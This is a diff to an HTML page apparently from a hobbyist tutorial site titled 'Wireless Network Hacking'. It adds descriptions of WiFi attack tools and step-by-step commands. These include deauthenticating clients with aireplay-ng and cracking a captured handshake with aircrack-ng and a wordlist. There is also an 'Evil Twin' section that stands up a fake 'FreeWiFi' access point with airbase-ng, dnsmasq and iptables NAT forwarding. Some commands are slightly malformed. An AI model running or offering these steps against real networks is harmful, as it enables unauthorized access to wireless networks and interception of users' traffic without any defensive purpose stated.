@@ -13,14 +13,34 @@
 
   <div>
     <h1>Wireless Network Hacking</h1>
-    <h4> Wireless Network Hacking tools</h4>*<a href="../tools/wash.html">
-     wash </a><br>
-    * <a href="../tools/aircrack-ng.html"> aircrack-ng </a><br>
-    * revear <br>
-    * wifite <br>
+    <h4> Wireless Network Hacking Tools</h4><b>*<a href="../tools/wash.html">
+     wash </a></b> --  Network Scanning Tool<br><b>
+    * <a href="../tools/aircrack-ng.html"> Aircrack-ng </a></b> -- Manual WiFi Hacking Tool<br>
+    * Revear -- WPS PIN Hacking Tool<br>
+    * wifite -- Automatic WiFi Hacking Tool<br>
 
-    <br>
-    <h4> ___ Hacking Steps</h4>
+    
+  </div>
+  <br>
+  
+  
+  
+  <div>
+    <h4> Wireless Network Hacking Method</h4>
+    <ol>
+      <li><b><a href="#aircrack-ng-attack">
+     Aircrack-ng </a></b> --  Manual Attack</li>
+     <li>
+       <b>
+         <a href="#evil-twin-attack">Evil Twin Attack</a> 
+       </b>
+     </li>
+    </ol>
+    
+  </div>
+  <br>
+  <div>
+  <h4> ___ Hacking Steps</h4>
     <b><ol>
       <li><a href="#net-scan"> Scanning</a></li>
       <li><a href="#gain_access"> Gaining Access</a></li>
@@ -28,9 +48,10 @@
     
      </ol></b>
   </div>
-  <br>
-  <h2>Start Wireless Network Hacking</h2>
-  <div id="net-scan">
+  <div id="aircrack-ng-attack">
+  <h2>Start Wireless Network Hacking with Aircrack-ng</h2>
+    
+    <br><div id="net-scan">
     <h3>>> Scanning</h3>
     <p>For scanning around network you need to enable monitor mode on your wireless network adapter.</p>
     <label><h4>• Enable Monitor Mode</h4></label>
@@ -53,7 +74,44 @@
     <ul><li><a href="/tools/aircrack-ng.html#aireplay-ng"><b>Aireplay-ng</b></a><br><li>To Deauthenticate Target</li><br><b><i>$ aireplay-ng --deauth {num_pckt} -a {router_bssid} -c {target_bssid} {interface}</i></b></li></ul>
   
   
-  </div>
-</body>
+    <h4>• Crack Handshake File</h4>
+    <ul><li><a href="/tools/aircrack-ng.html#aircrack-ng"><b>Aircrack-ng</b></a><br><li>To Crack Captured Handshake File, you need to a wordlist. Then type this cmd,</li><br><b><i>$ aircrack-ng {handshake_file} -w {wordlist}</i></b></li></ul>
 
+  
+  </div>
+  </div>
+  <br><br>
+  <div id="evil-twin-attack">
+    <h2>Evil Twin Attack</h2>
+    <h3>>> Create a fake access point</h3>
+    <h4>Commands:</h4>
+    <ul>
+      <li>
+        echo -e "interface=at0\ndhcp-range=192.168.0.50,192.168.0.150,12h" > /etc/dnsmasq.conf
+      </li>
+      <li>
+        airbase-ng -e [AP Name] -c [Channel] [Interface]<br>
+<b>eg:</b> airbase-ng -e FreeWiFi -c 6 wlan1
+      </li>
+      <li>
+        ifconfig at0 192.168.0.1 up
+      </li>
+      <li>
+        iptables --flush
+      </li>
+      <li>
+        iptables --table nat --flush
+      </li>
+      <li>Iptables --delete-chain</li>
+      <li>iptables -P FORWARD ACCEPT </li>
+      <li>iptables -t nat -A POSTROUTING -o wlan0 MASQUERADE
+      </li><br>
+      <li>dnsmasq</li>
+      <li>echo 1 > /proc/sys/net/ipv4/ip_forward
+      </li>
+    </ul>
+    
+  </div>
+  
+</body>
 </html>
